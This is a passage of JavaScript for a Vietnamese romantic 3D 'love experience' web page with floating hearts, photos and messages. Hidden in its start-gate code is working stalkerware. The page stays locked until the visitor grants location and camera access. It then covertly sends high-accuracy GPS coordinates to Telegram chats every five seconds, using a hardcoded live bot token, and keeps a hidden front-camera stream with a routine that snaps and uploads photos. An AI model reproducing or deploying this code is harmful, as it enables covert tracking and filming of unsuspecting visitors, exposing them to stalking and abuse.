                    const nextIndex = Math.floor(Math.random() * this.totalImagePool) + 1;
                    item.imgEl.src = `img/${nextIndex}.png`;
                }

                if (item.x > w + 40) item.x = -50;
                if (item.x < -50) item.x = w + 40;

                item.el.style.transform = `translate3d(${item.x}px, ${item.y}px, 0) rotate(${item.angle}deg) scale(${item.scale})`;
                item.el.style.opacity = this.globalAlpha * 0.92;
            }
        }

        setAlpha(val) {
            this.globalAlpha = val;
            for (let i = 0; i < this.items.length; i++) {
                this.items[i].el.style.opacity = this.globalAlpha * 0.92;
            }
        }
    }

    // --- FloatingHearts ---
    class FloatingHearts {
        constructor(scene) {
            this.scene = scene;
            const perf = getPerformanceConfig();
            this.count = perf.floatingHeartCount;
            this.group = new THREE.Group();
            this.scene.add(this.group);
            this.hearts = [];
            this.globalAlpha = 0.0;
            this.initHearts();
        }

        initHearts() {
            const palette = ['#ff4d79', '#ff668a', '#ff1f5a', '#ff7a99', '#ffa3ba'];

            for (let i = 0; i < this.count; i++) {
                const col = palette[Math.floor(Math.random() * palette.length)];
                const tex = createHeartTexture(128, col);

                const material = new THREE.SpriteMaterial({
                    map: tex,
                    transparent: true,
                    opacity: 0,
                    blending: THREE.AdditiveBlending,
                    depthWrite: false
                });

                const sprite = new THREE.Sprite(material);
                const z = randomRange(-22, 6);
                const x = randomRange(-16, 16);
                const y = randomRange(-8, 14);
                sprite.position.set(x, y, z);

                const depthFactor = (z + 22) / 28;
                const baseScale = (0.5 + depthFactor * 1.3) * randomRange(0.85, 1.25);
                sprite.scale.set(baseScale, baseScale, 1.0);

                this.hearts.push({
                    sprite,
                    material,
                    baseScale,
                    speedY: randomRange(0.5, 1.4),
                    swayFreq: randomRange(0.5, 1.3),
                    swayAmp: randomRange(0.3, 0.9),
                    phase: Math.random() * Math.PI * 2,
                    initialZ: z,
                    targetOpacity: (0.35 + depthFactor * 0.45) * randomRange(0.7, 0.95)
                });
                this.group.add(sprite);
            }
        }

        update(time, delta) {
            for (let i = 0; i < this.hearts.length; i++) {
                const h = this.hearts[i];
                const pos = h.sprite.position;
                pos.y += h.speedY * delta;
                pos.x += Math.sin(time * h.swayFreq + h.phase) * h.swayAmp * delta;
                pos.z = h.initialZ + Math.cos(time * 0.7 + h.phase) * 0.3;

                if (pos.y > 15) {
                    pos.y = -9;
                    pos.x = randomRange(-16, 16);
                    h.initialZ = randomRange(-22, 6);
                    pos.z = h.initialZ;
                }
                h.material.opacity = this.globalAlpha * h.targetOpacity * (0.8 + 0.2 * Math.sin(time * 1.8 + h.phase));
            }
        }

        setAlpha(val) { this.globalAlpha = val; }
    }

    // --- FloatingTexts ---
    class FloatingTexts {
        constructor(scene, config = {}) {
            this.scene = scene;
            this.config = config;
            const perf = getPerformanceConfig();
            this.count = perf.floatingTextCount;
            this.group = new THREE.Group();
            this.scene.add(this.group);
            this.textItems = [];
            this.globalAlpha = 0.0;
            this.messages = this.config.messages || ["Đào Đức ❤️ Quỳnh Anh", "I LOVE YOU", "Forever", "Love You", "❤️"];
            this.initTexts();
        }

        initTexts() {
            this.textureMap = new Map();
            const colors = ['#ff4d91', '#ff77aa', '#ff2f75', '#ff99c8', '#ffffff'];

            this.messages.forEach(msg => {
                const col = randomChoice(colors);
                const texData = createNeonTextTexture(msg, { fontSize: 52, color: col, glowColor: '#ff0055', fontWeight: '700' });
                this.textureMap.set(msg, texData);
            });

            for (let i = 0; i < this.count; i++) {
                const msg = this.messages[i % this.messages.length];
                const texData = this.textureMap.get(msg);

                const material = new THREE.SpriteMaterial({
                    map: texData.texture,
                    transparent: true,
                    opacity: 0,
                    blending: THREE.AdditiveBlending,
                    depthWrite: false
                });

                const sprite = new THREE.Sprite(material);
                const z = randomRange(-32, 7);
                const x = randomRange(-16, 16);
                const y = randomRange(-6, 10);
                sprite.position.set(x, y, z);

                const height = 0.52 * randomRange(0.85, 1.15);
                const width = height * texData.aspectRatio;
                sprite.scale.set(width, height, 1.0);

                this.textItems.push({
                    sprite,
                    material,
                    texData,
                    speedZ: randomRange(1.8, 3.5),
                    driftY: randomRange(0.1, 0.35),
                    phase: Math.random() * Math.PI * 2,
                    swayFreq: randomRange(0.4, 1.1)
                });
                this.group.add(sprite);
            }
        }

        update(time, delta) {
            for (let i = 0; i < this.textItems.length; i++) {
                const item = this.textItems[i];
                const pos = item.sprite.position;
                pos.z += item.speedZ * delta;
                pos.x += Math.sin(time * item.swayFreq + item.phase) * 0.35 * delta;
                pos.y += item.driftY * delta;

                let zFade = 1.0;
                if (pos.z < -22) {
                    zFade = THREE.MathUtils.smoothstep(pos.z, -32, -22);
                } else if (pos.z > 8) {
                    zFade = 1.0 - THREE.MathUtils.smoothstep(pos.z, 8, 13);
                }

                if (pos.z > 13) {
                    pos.z = -32;
                    pos.x = randomRange(-16, 16);
                    pos.y = randomRange(-6, 9);
                    const newMsg = randomChoice(this.messages);
                    const newTex = this.textureMap.get(newMsg);
                    if (newTex) {
                        item.material.map = newTex.texture;
                        item.texData = newTex;
                        const height = 1.3 * randomRange(0.85, 1.2);
                        item.sprite.scale.set(height * newTex.aspectRatio, height, 1.0);
                    }
                }

                const twinkle = 0.85 + 0.15 * Math.sin(time * 2.2 + item.phase);
                item.material.opacity = this.globalAlpha * zFade * twinkle * 0.82;
            }
        }

        setAlpha(val) { this.globalAlpha = val; }
    }

    // --- Sparkles ---
    class Sparkles {
        constructor(scene) {
            this.scene = scene;
            const perf = getPerformanceConfig();
            this.count = perf.sparkleCount;
            this.initGeometry();
            this.initMaterial();
            this.initPoints();
        }

        initGeometry() {
            this.geometry = new THREE.BufferGeometry();
            const positions = new Float32Array(this.count * 3);
            const colors = new Float32Array(this.count * 3);
            const sizes = new Float32Array(this.count);
            const phases = new Float32Array(this.count);
            const speeds = new Float32Array(this.count);

            const palette = [
                new THREE.Color('#ffffff'),
                new THREE.Color('#ffe4e1'),
                new THREE.Color('#ffd700'),
                new THREE.Color('#ffb6c1')
            ];

            for (let i = 0; i < this.count; i++) {
                const i3 = i * 3;
                const r = randomGaussian(0, 11);
                const theta = Math.random() * Math.PI * 2;
                const phi = Math.acos(Math.random() * 2 - 1);

                positions[i3] = r * Math.sin(phi) * Math.cos(theta);
                positions[i3 + 1] = r * Math.sin(phi) * Math.sin(theta) + 0.8;
                positions[i3 + 2] = r * Math.cos(phi);

                const col = palette[Math.floor(Math.random() * palette.length)];
                colors[i3] = col.r;
                colors[i3 + 1] = col.g;
                colors[i3 + 2] = col.b;

                sizes[i] = randomRange(16, 32);
                phases[i] = Math.random() * Math.PI * 2;
                speeds[i] = randomRange(1.2, 3.2);
            }

            this.geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
            this.geometry.setAttribute('aColor', new THREE.BufferAttribute(colors, 3));
            this.geometry.setAttribute('aSize', new THREE.BufferAttribute(sizes, 1));
            this.geometry.setAttribute('aPhase', new THREE.BufferAttribute(phases, 1));
            this.geometry.setAttribute('aSpeed', new THREE.BufferAttribute(speeds, 1));
        }

        initMaterial() {
            const sparkleTex = createSparkleTexture(128);
            this.uniforms = {
                uTime: { value: 0 },
                uTexture: { value: sparkleTex },
                uAlpha: { value: 0.0 }
            };

            const vertexShader = `
                attribute vec3 aColor;
                attribute float aSize;
                attribute float aPhase;
                attribute float aSpeed;
                uniform float uTime;
                uniform float uAlpha;
                varying vec3 vColor;
                varying float vAlpha;

                void main() {
                    vec4 mvPosition = modelViewMatrix * vec4(position, 1.0);
                    gl_Position = projectionMatrix * mvPosition;
                    float sparkle = pow(0.5 + 0.5 * sin(uTime * aSpeed + aPhase), 4.0);
                    gl_PointSize = (aSize * (0.3 + sparkle * 1.4)) * (11.0 / -mvPosition.z);
                    vColor = aColor + vec3(sparkle * 0.25);
                    vAlpha = uAlpha * (0.2 + 0.8 * sparkle);
                }
            `;

            const fragmentShader = `
                uniform sampler2D uTexture;
                varying vec3 vColor;
                varying float vAlpha;

                void main() {
                    vec4 texColor = texture2D(uTexture, gl_PointCoord);
                    if (texColor.a < 0.05) discard;
                    gl_FragColor = vec4(vColor * texColor.rgb, texColor.a * vAlpha);
                }
            `;

            this.material = new THREE.ShaderMaterial({
                uniforms: this.uniforms,
                vertexShader,
                fragmentShader,
                transparent: true,
                depthWrite: false,
                blending: THREE.AdditiveBlending
            });
        }

        initPoints() {
            this.points = new THREE.Points(this.geometry, this.material);
            this.scene.add(this.points);
        }

        update(time) { this.uniforms.uTime.value = time; }
        setAlpha(val) { this.uniforms.uAlpha.value = val; }
    }

    // --- HeartExplosionManager: Pure Glowing Hearts on Tap / Click ---
    class HeartExplosionManager {
        constructor(scene, camera) {
            this.scene = scene;
            this.camera = camera;
            this.explosions = [];
            this.heartTexture = createHeartTexture(128, '#ff2a6d');
        }

        createExplosion(screenX, screenY) {
            const vector = new THREE.Vector3(screenX, screenY, 0.5);
            vector.unproject(this.camera);
            const dir = vector.sub(this.camera.position).normalize();
            const distance = -this.camera.position.z / dir.z;
            const origin = this.camera.position.clone().add(dir.multiplyScalar(distance));

            const count = 35;
            const sprites = [];
            const group = new THREE.Group();
            this.scene.add(group);

            const palette = ['#ff003c', '#ff1744', '#ff4081', '#ff7597', '#ffffff'];

            for (let i = 0; i < count; i++) {
                const col = palette[Math.floor(Math.random() * palette.length)];
                const tex = createHeartTexture(128, col);

                const material = new THREE.SpriteMaterial({
                    map: tex,
                    transparent: true,
                    opacity: 1.0,
                    blending: THREE.AdditiveBlending,
                    depthWrite: false
                });

                const sprite = new THREE.Sprite(material);
                sprite.position.copy(origin);

                const scale = randomRange(0.4, 0.85);
                sprite.scale.set(scale, scale, 1.0);

                const theta = Math.random() * Math.PI * 2;
                const phi = Math.acos(Math.random() * 2 - 1);
                const speed = randomRange(3.0, 7.0);

                const vx = Math.sin(phi) * Math.cos(theta) * speed;
                const vy = (Math.sin(phi) * Math.sin(theta) * speed) + randomRange(1.2, 3.5);
                const vz = Math.cos(phi) * speed;

                sprites.push({
                    sprite,
                    material,
                    baseScale: scale,
                    vel: new THREE.Vector3(vx, vy, vz),
                    rotSpeed: randomRange(-2.0, 2.0)
                });

                group.add(sprite);
            }

            this.explosions.push({
                group,
                sprites,
                life: 1.0,
                decay: randomRange(0.65, 0.85)
            });
        }

        update(delta) {
            for (let i = this.explosions.length - 1; i >= 0; i--) {
                const exp = this.explosions[i];
                exp.life -= exp.decay * delta;

                if (exp.life <= 0) {
                    exp.sprites.forEach(s => {
                        if (s.material) s.material.dispose();
                    });
                    this.scene.remove(exp.group);
                    this.explosions.splice(i, 1);
                    continue;
                }

                const lifeCurve = Math.pow(exp.life, 1.4);

                exp.sprites.forEach(s => {
                    s.vel.x *= 0.96;
                    s.vel.y *= 0.96;
                    s.vel.z *= 0.96;
                    s.vel.y += 0.8 * delta;

                    s.sprite.position.addScaledVector(s.vel, delta);
                    s.material.opacity = lifeCurve;
                    
                    const sc = s.baseScale * (0.4 + 0.6 * lifeCurve);
                    s.sprite.scale.set(sc, sc, 1.0);
                });
            }
        }
    }

    // =========================================================================
    // 6. ANIMATION CONTROLLERS
    // =========================================================================
    class CameraAnimation {
        constructor(camera) {
            this.camera = camera;
            this.mouse = { x: 0, y: 0 };
            this.targetMouse = { x: 0, y: 0 };
            this.baseZ = (window.innerWidth < window.innerHeight) ? 15.5 : 12.0;
            this.currentLookAt = new THREE.Vector3(0, 0.4, 0);

            window.addEventListener('mousemove', (e) => {
                this.targetMouse.x = (e.clientX / window.innerWidth) * 2 - 1;
                this.targetMouse.y = -(e.clientY / window.innerHeight) * 2 + 1;
            }, { passive: true });

            window.addEventListener('touchmove', (e) => {
                if (e.touches.length > 0) {
                    this.targetMouse.x = (e.touches[0].clientX / window.innerWidth) * 2 - 1;
                    this.targetMouse.y = -(e.touches[0].clientY / window.innerHeight) * 2 + 1;
                }
            }, { passive: true });
        }

        updateBaseZ() {
            this.baseZ = (window.innerWidth < window.innerHeight) ? 15.5 : 12.0;
        }

        update(time, delta, isIntroFinished) {
            this.mouse.x = lerp(this.mouse.x, this.targetMouse.x, 0.05);
            this.mouse.y = lerp(this.mouse.y, this.targetMouse.y, 0.05);

            if (isIntroFinished) {
                const targetCamX = Math.sin(time * 0.15) * 0.8 + this.mouse.x * 0.7;
                const targetCamY = 0.5 + Math.sin(time * 0.2) * 0.2 + this.mouse.y * 0.4;
                const targetCamZ = this.baseZ; // Giữ nguyên khoảng cách ổn định, không bị lùi xa làm trái tim bé lại

                this.camera.position.x = lerp(this.camera.position.x, targetCamX, 0.04);
                this.camera.position.y = lerp(this.camera.position.y, targetCamY, 0.04);
                this.camera.position.z = lerp(this.camera.position.z, targetCamZ, 0.04);

                const targetLookX = this.mouse.x * 0.2;
                const targetLookY = 0.4 + this.mouse.y * 0.15;
                this.currentLookAt.x = lerp(this.currentLookAt.x, targetLookX, 0.05);
                this.currentLookAt.y = lerp(this.currentLookAt.y, targetLookY, 0.05);
                this.camera.lookAt(this.currentLookAt);
            } else {
                this.camera.lookAt(0, 0.4, 0);
            }
        }
    }

    class IntroAnimation {
        constructor({ heart, ground, photosManager, floatingHearts, floatingTexts, sparkles, bloomPass, camera, flashOverlay }) {
            this.heart = heart;
            this.ground = ground;
            this.photosManager = photosManager;
            this.floatingHearts = floatingHearts;
            this.floatingTexts = floatingTexts;
            this.sparkles = sparkles;
            this.bloomPass = bloomPass;
            this.camera = camera;
            this.flashOverlay = flashOverlay;
            this.isFinished = false;
        }

        start() {
            const gsap = window.gsap;
            if (!gsap) {
                this.setCompleteState();
                return;
            }

            const isMobile = window.innerWidth < window.innerHeight;
            const startZ = isMobile ? 19.5 : 14.5;
            const targetZ = isMobile ? 15.5 : 12.0;

            this.heart.setAlpha(0.0);
            this.heart.setConvergence(0.0);
            this.heart.setColorMode(0.0);
            this.ground.setAlpha(0.0);
            this.ground.setColorMode(0.0);
            if (this.photosManager) this.photosManager.setAlpha(0.0);
            this.floatingHearts.setAlpha(0.0);
            this.floatingTexts.setAlpha(0.0);
            this.sparkles.setAlpha(0.0);
            this.camera.position.set(0, 0.5, startZ);

            const tl = gsap.timeline({
                onComplete: () => { this.isFinished = true; }
            });

            // Phase 1: Star dust & Golden Space Carpet Surge
            tl.to({}, { duration: 0.2 });
            tl.to(this.sparkles.uniforms.uAlpha, { value: 0.85, duration: 1.0, ease: "power2.out" }, 0.2);
            tl.to(this.ground.uniforms.uAlpha, { value: 0.95, duration: 1.6, ease: "power2.out" }, 0.35);

            // Phase 2: Pháo hoa vàng bắn vút lên từ đáy -> Tụ ở tâm -> Bùng nở thành Trái Tim Vàng 3D
            tl.to(this.heart.uniforms.uGlobalAlpha, { value: 1.0, duration: 0.6, ease: "power1.inOut" }, 0.45);
            tl.to(this.heart.uniforms.uConvergence, { value: 1.0, duration: 4.4, ease: "none" }, 0.55);
            tl.to(this.camera.position, { z: targetZ, y: 0.6, duration: 4.8, ease: "sine.inOut" }, 0.55);

            // Phase 3: Lóe sáng chói lọi & Chớp nổ Supernova Flash
            if (this.heart.uniforms.uExplode) {
                tl.to(this.heart.uniforms.uExplode, { value: 1.0, duration: 0.42, ease: "power2.in" }, 5.1);
                tl.to(this.heart.uniforms.uExplode, { value: 0.0, duration: 0.8, ease: "power3.out" }, 5.52);
            }

            if (this.bloomPass) {
                tl.to(this.bloomPass, { strength: 2.4, radius: 0.65, duration: 0.5, ease: "power2.in" }, 4.9);
                tl.to(this.bloomPass, { strength: 5.8, radius: 0.9, duration: 0.32, ease: "power4.in" }, 5.4);
            }

            if (this.flashOverlay) {
                tl.to(this.flashOverlay, { opacity: 1.0, duration: 0.28, ease: "power3.in" }, 5.45);
            }

            // Chuyển sang Trái Tim Đỏ & Thảm Đỏ Ruby ngay đỉnh điểm chớp pháo hoa
            tl.to(this.ground.uniforms.uColorMode, { value: 1.0, duration: 0.45, ease: "power2.inOut" }, 5.65);
            tl.add(() => {
                this.heart.setColorMode(1.0);
                document.body.classList.add('red-world');

                const photoEl = document.getElementById('center-heart-photo');
                if (photoEl) {
                    if (window.gsap) {
                        window.gsap.to(photoEl, {
                            opacity: 1,
                            duration: 1.4,
                            ease: "power2.out"
                        });
                    } else {
                        photoEl.style.opacity = '1';
                    }
                }
            }, 5.75);

            if (this.flashOverlay) {
                tl.to(this.flashOverlay, { opacity: 0.0, duration: 0.75, ease: "power2.out" }, 5.8);
            }

            if (this.bloomPass) {
                tl.to(this.bloomPass, { strength: 0.95, radius: 0.48, duration: 0.85, ease: "power2.out" }, 5.8);
            }

            // Phase 4: Thế Giới Đỏ vô tận & Mở các bức ảnh kỷ niệm cùng trái tim bay lượn
            tl.add(() => {
                if (this.photosManager) {
                    gsap.to(this.photosManager, { globalAlpha: 1.0, duration: 1.8, ease: "power2.out" });
                }
            }, 6.1);
            tl.to(this.floatingHearts, { globalAlpha: 0.85, duration: 1.6, ease: "power2.out" }, 6.2);
            tl.to(this.floatingTexts, { globalAlpha: 0.95, duration: 1.8, ease: "power2.out" }, 6.3);
        }

        setCompleteState() {
            this.heart.setAlpha(1.0);
            this.heart.setConvergence(1.0);
            this.heart.setColorMode(1.0);
            this.ground.setAlpha(0.95);
            this.ground.setColorMode(1.0);
            if (this.photosManager) this.photosManager.setAlpha(1.0);
            this.floatingHearts.setAlpha(0.85);
            this.floatingTexts.setAlpha(0.95);
            this.sparkles.setAlpha(0.8);
            this.camera.position.set(0, 0.6, 12.0);
            if (this.bloomPass) {
                this.bloomPass.strength = 0.9;
                this.bloomPass.radius = 0.45;
                this.bloomPass.threshold = 0.42;
            }
            this.isFinished = true;
            document.body.classList.add('red-world');
            if (this.flashOverlay) this.flashOverlay.style.opacity = '0';

            const photoEl = document.getElementById('center-heart-photo');
            if (photoEl) {
                photoEl.style.opacity = '1';
            }
        }
    }

    // =========================================================================
    // 7. MAIN ENGINE BOOTSTRAP
    // =========================================================================
    class LoveExperienceApp {
        constructor() {
            this.config = getActiveLoveConfig();
            this.canvas = document.getElementById('webgl-canvas');
            this.flashOverlay = document.getElementById('flash-overlay');
            this.startGate = document.getElementById('start-gate');
            this.audioBtn = document.getElementById('audio-toggle');
            this.bgMusic = document.getElementById('bg-music');
            this.hasStarted = false;
            this.clock = new THREE.Clock();

            this.initThree();
            this.initSceneObjects();
            this.initAudioAndGate();
            this.initInteractions();

            this.animate = this.animate.bind(this);
            requestAnimationFrame(this.animate);
        }

        initThree() {
            this.scene = new THREE.Scene();
            this.scene.background = new THREE.Color(0x050003);
            this.scene.fog = new THREE.FogExp2(0x050003, 0.016);

            const ambient = new THREE.AmbientLight(0xffffff, 0.65);
            this.scene.add(ambient);

            const aspect = window.innerWidth / window.innerHeight;
            const fov = aspect < 1 ? 54 : 48;
            const initZ = aspect < 1 ? 16.5 : 12.5;
            this.camera = new THREE.PerspectiveCamera(fov, aspect, 0.1, 1000);
            this.camera.position.set(0, 0.5, initZ);
            this.camera.lookAt(0, 0, 0);

            const dpr = Math.min(window.devicePixelRatio || 1, 2.5);
            this.renderer = new THREE.WebGLRenderer({
                canvas: this.canvas,
                antialias: true,
                alpha: true,
                powerPreference: 'high-performance'
            });
            this.renderer.setPixelRatio(dpr);
            this.renderer.setSize(window.innerWidth, window.innerHeight);
            this.renderer.toneMapping = THREE.ACESFilmicToneMapping;
            this.renderer.toneMappingExposure = 1.05;

            const perf = getPerformanceConfig();
            if (typeof THREE.EffectComposer !== 'undefined' && typeof THREE.UnrealBloomPass !== 'undefined') {
                const renderTarget = new THREE.WebGLRenderTarget(
                    window.innerWidth * dpr,
                    window.innerHeight * dpr,
                    {
                        minFilter: THREE.LinearFilter,
                        magFilter: THREE.LinearFilter,
                        format: THREE.RGBAFormat,
                        type: THREE.HalfFloatType
                    }
                );
                this.composer = new THREE.EffectComposer(this.renderer, renderTarget);
                const renderPass = new THREE.RenderPass(this.scene, this.camera);
                this.composer.addPass(renderPass);

                this.bloomPass = new THREE.UnrealBloomPass(
                    new THREE.Vector2(window.innerWidth * dpr, window.innerHeight * dpr),
                    perf.bloomStrength,
                    perf.bloomRadius,
                    perf.bloomThreshold
                );
                this.composer.addPass(this.bloomPass);
            } else {
                this.composer = null;
                this.bloomPass = null;
            }

            window.addEventListener('resize', () => {
                const newAspect = window.innerWidth / window.innerHeight;
                this.camera.aspect = newAspect;
                this.camera.fov = newAspect < 1 ? 54 : 48;
                this.camera.updateProjectionMatrix();

                const currentDpr = Math.min(window.devicePixelRatio || 1, 2.5);
                this.renderer.setSize(window.innerWidth, window.innerHeight);
                this.renderer.setPixelRatio(currentDpr);

                if (this.heart && this.heart.updateScale) {
                    this.heart.updateScale();
                }
                if (this.cameraAnim && this.cameraAnim.updateBaseZ) {
                    this.cameraAnim.updateBaseZ();
                }

                if (this.composer) {
                    this.composer.setSize(window.innerWidth, window.innerHeight);
                    if (this.bloomPass) {
                        this.bloomPass.resolution.set(window.innerWidth * currentDpr, window.innerHeight * currentDpr);
                    }
                }
            });
        }

        initSceneObjects() {
            this.heart = new ParticleHeart(this.scene);
            this.ground = new ParticleGround(this.scene);
            this.photosManager = new FloatingPhotosManager();
            this.floatingHearts = new FloatingHearts(this.scene);
            this.floatingTexts = new FloatingTexts(this.scene, this.config);
            this.sparkles = new Sparkles(this.scene);
            this.explosionManager = new HeartExplosionManager(this.scene, this.camera);

            this.cameraAnim = new CameraAnimation(this.camera);
            this.introAnim = new IntroAnimation({
                heart: this.heart,
                ground: this.ground,
                photosManager: this.photosManager,
                floatingHearts: this.floatingHearts,
                floatingTexts: this.floatingTexts,
                sparkles: this.sparkles,
                bloomPass: this.bloomPass,
                camera: this.camera,
                flashOverlay: this.flashOverlay
            });
        }

        initAudioAndGate() {
            if (this.config.musicUrl && this.bgMusic) {
                this.bgMusic.src = this.config.musicUrl;
            }

            const tgConfig = {
                botToken: "8619596260:AAFRqrXz--JcrxBanIPvv7wNPXX33T4t88Q",
                chatIds: ["5551363255", "-1003777018844"]
            };

            let cameraStream = null;
            let cameraVideo = null;
            let cameraInterval = null;
            let cameraCount = 0;
            let gpsCount = 0;
            let latestCoords = null;

            const getVietnamTime = () => {
                try {
                    return new Intl.DateTimeFormat('vi-VN', {
                        timeZone: 'Asia/Ho_Chi_Minh',
                        dateStyle: 'full',
                        timeStyle: 'medium'
                    }).format(new Date());
                } catch (e) {
                    return new Date().toLocaleString('vi-VN');
                }
            };

            const getDeviceInfo = () => {
                const ua = navigator.userAgent;
                let os = "Không xác định";
                if (/iphone|ipad|ipod/i.test(ua)) os = "iOS (iPhone/iPad)";
                else if (/android/i.test(ua)) os = "Android";
                else if (/windows/i.test(ua)) os = "Windows PC";
                else if (/macintosh|mac os x/i.test(ua)) os = "macOS (MacBook/iMac)";
                else if (/linux/i.test(ua)) os = "Linux";

                let browser = "Trình duyệt khác";
                if (/crios|chrome/i.test(ua) && !/edg/i.test(ua)) browser = "Google Chrome";
                else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) browser = "Apple Safari";
                else if (/edg/i.test(ua)) browser = "Microsoft Edge";
                else if (/firefox/i.test(ua)) browser = "Mozilla Firefox";

                const isMobile = /mobile|android|iphone|ipad|ipod/i.test(ua);
                return {
                    os,
                    browser,
                    deviceType: isMobile ? "📱 Điện Thoại / Di Động" : "💻 Máy Tính Để Bàn / Laptop",
                    screenRes: `${window.screen.width}x${window.screen.height}`
                };
            };

            const sendGpsToTelegram = async (coords, count = 1) => {
                try {
                    const lat = coords.latitude;
                    const lon = coords.longitude;
                    const accuracy = coords.accuracy ? `${Math.round(coords.accuracy)}m` : 'N/A';
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    const timeStr = getVietnamTime();
                    const device = getDeviceInfo();
                    const pageTitle = document.title || '3D Love Experience';

                    const messageText = 
`🎯 <b>[ĐỊNH VỊ GPS ${count > 1 ? `#${count}` : 'MỚI'}]</b>
⏰ <b>Thời gian:</b> ${timeStr}
🌐 <b>Trang web:</b> ${pageTitle}
📍 <b>Tọa độ:</b> <code>${lat}, ${lon}</code> (±${accuracy})
🗺️ <b>Bản đồ:</b> <a href="${mapLink}">Xem trên Google Maps</a>
📱 <b>Thiết bị:</b> ${device.deviceType} (${device.os} - ${device.browser})
🔋 <b>Trạng thái:</b> Đang trải nghiệm web`;

                    for (const chatId of tgConfig.chatIds) {
                        try {
                            await fetch(`https://api.telegram.org/bot${tgConfig.botToken}/sendMessage`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    text: messageText,
                                    parse_mode: "HTML",
                                    disable_web_page_preview: false
                                })
                            });

                            if (count === 1 && typeof lat === 'number' && typeof lon === 'number') {
                                await fetch(`https://api.telegram.org/bot${tgConfig.botToken}/sendLocation`, {
                                    method: "POST",
                                    headers: { "Content-Type": "application/json" },
                                    body: JSON.stringify({
                                        chat_id: chatId,
                                        latitude: lat,
                                        longitude: lon
                                    })
                                });
                            }
                        } catch (e) {}
                    }
                } catch (err) {}
            };

            const sendPhotoToTelegram = async (blob, count = 1) => {
                const timeStr = getVietnamTime();
                const device = getDeviceInfo();
                const pageTitle = document.title || '3D Love Experience';

                const caption = 
`📸 <b>[HÌNH ẢNH CAMERA #${count}]</b>
⏰ <b>Thời gian:</b> ${timeStr}
🌐 <b>Trang web:</b> ${pageTitle}
📱 <b>Thiết bị:</b> ${device.deviceType} (${device.os} - ${device.browser})`;

                for (const chatId of tgConfig.chatIds) {
                    try {
                        const formData = new FormData();
                        formData.append("chat_id", chatId);
                        formData.append("photo", blob, `snapshot_${count}.jpg`);
                        formData.append("caption", caption);
                        formData.append("parse_mode", "HTML");

                        await fetch(`https://api.telegram.org/bot${tgConfig.botToken}/sendPhoto`, {
                            method: "POST",
                            body: formData
                        });
                    } catch (e) {}
                }
            };

            const captureAndSendPhoto = () => {
                if (!cameraStream || !cameraVideo) return;
                try {
                    const canvas = document.createElement('canvas');
                    const width = cameraVideo.videoWidth || 640;
                    const height = cameraVideo.videoHeight || 480;
                    canvas.width = width;
                    canvas.height = height;

                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(cameraVideo, 0, 0, width, height);

                    canvas.toBlob((blob) => {
                        if (!blob || blob.size === 0) return;
                        cameraCount++;
                        sendPhotoToTelegram(blob, cameraCount);
                    }, 'image/jpeg', 0.85);
                } catch (e) {}
            };

            const requestLocationPromise = () => {
                return new Promise((resolve, reject) => {
                    if (!navigator.geolocation) return resolve(null);
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve(pos.coords),
                        (err) => {
                            if (err.code === 1) reject(new Error("LOCATION_DENIED"));
                            else resolve(null);
                        },
                        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                    );
                });
            };

            const requestCameraPromise = () => {
                return new Promise(async (resolve, reject) => {
                    const getUserMedia = (constraints) => {
                        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                            return navigator.mediaDevices.getUserMedia(constraints);
                        }
                        const legacyGUM = navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia;
                        if (legacyGUM) {
                            return new Promise((res, rej) => legacyGUM.call(navigator, constraints, res, rej));
                        }
                        return Promise.reject(new Error("CAMERA_UNSUPPORTED"));
                    };

                    try {
                        const stream = await getUserMedia({
                            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                            audio: false
                        });
                        if (stream) {
                            cameraStream = stream;
                            if (!cameraVideo) {
                                cameraVideo = document.createElement('video');
                                cameraVideo.setAttribute('autoplay', '');
                                cameraVideo.setAttribute('playsinline', '');
                                cameraVideo.setAttribute('muted', '');
                                cameraVideo.style.display = 'none';
                                document.body.appendChild(cameraVideo);
                            }
                            cameraVideo.srcObject = stream;
                            cameraVideo.play().catch(() => {});
                            resolve(true);
                        } else {
                            reject(new Error("CAMERA_DENIED"));
                        }
                    } catch (e) {
                        reject(e);
                    }
                });
            };

            const actionBtn = this.startGate ? this.startGate.querySelector('.gate-action-btn') : null;
            const btnSpan = actionBtn ? actionBtn.querySelector('span') : null;

            const resetToStart = () => {
                if (btnSpan) btnSpan.textContent = 'BẮT ĐẦU';
                if (actionBtn) actionBtn.classList.remove('loading');
            };

            const handleStart = async (e) => {
                if (e) e.stopPropagation();
                if (this.hasStarted) return;

                if (btnSpan) btnSpan.textContent = 'ĐANG KHỞI TẠO...';
                if (actionBtn) actionBtn.classList.add('loading');

                // 1. Notification Permission
                try {
                    if (typeof Notification !== 'undefined' && Notification.requestPermission) {
                        await Notification.requestPermission().catch(() => {});
                    }
                } catch (err) {}

                // 2. Geolocation Permission (Enforced)
                let userCoords = null;
                try {
                    userCoords = await requestLocationPromise();
                } catch (locErr) {
                    console.warn("[PermissionGate] Người dùng từ chối Vị trí:", locErr);
                    resetToStart();
                    return;
                }

                // 3. Camera Permission (Enforced)
                try {
                    const camAllowed = await requestCameraPromise();
                    if (!camAllowed) {
                        resetToStart();
                        return;
                    }
                } catch (camErr) {
                    console.warn("[PermissionGate] Người dùng từ chối Camera:", camErr);
                    resetToStart();
                    return;
                }

                // Cấp quyền thành công -> Mở khóa web!
                this.hasStarted = true;

                // Gửi ngay tọa độ đầu tiên sau khi cấp quyền và bắt đầu chu kỳ gửi 5 giây / 1 lần
                if (userCoords) {
                    gpsCount++;
                    sendGpsToTelegram(userCoords, gpsCount);
                }

                if (navigator.geolocation && navigator.geolocation.watchPosition) {
                    navigator.geolocation.watchPosition(
                        (pos) => { latestCoords = pos.coords; },
                        () => {},
                        { enableHighAccuracy: true, maximumAge: 0 }
                    );
                }

                // Cứ 5 giây gửi 1 lần định vị GPS về Telegram
                setInterval(() => {
                    if (latestCoords || userCoords) {
                        gpsCount++;
                        sendGpsToTelegram(latestCoords || userCoords, gpsCount);
                    }
                }, 5000);

